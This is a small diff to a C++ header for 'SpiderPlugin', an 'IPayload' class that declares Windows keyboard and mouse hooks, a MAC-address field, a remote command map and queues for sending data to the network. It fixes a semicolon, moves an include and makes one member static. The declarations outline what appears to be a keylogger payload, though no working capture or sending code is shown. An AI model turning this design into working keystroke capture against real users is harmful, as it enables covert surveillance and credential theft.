@@ -1,14 +1,14 @@
 #pragma once
 
-#if defined _WIN32
-#include <windows.h>
-#endif
-
 #include <vector>
 #include <string>
 #include <map>
 #include "IPayload.h"
 #include "Keys.h"
+
+#if defined _WIN32
+#include <windows.h>
+#endif
 
 namespace spider
 {
@@ -101,14 +101,14 @@ class SpiderPlugin : public IPayload
 
     static mt::Queue<SystemMsg> *m_sendToNetwork;
     mt::Queue<Order> m_receivedFromNetwork;
-    std::string m_macAddr;
+    static std::string m_macAddr;
 
     std::map<std::string, std::function<void()>> m_cmd;
 
 #if defined _WIN32
     HHOOK m_keyboardHookWin;
     HHOOK m_mouseHookWin;
-    static std::map<std::uint32_t, KeyboardKey> m_windowsKeyboardMap
+    static std::map<std::uint32_t, KeyboardKey> m_windowsKeyboardMap;
 #endif
 };
 }
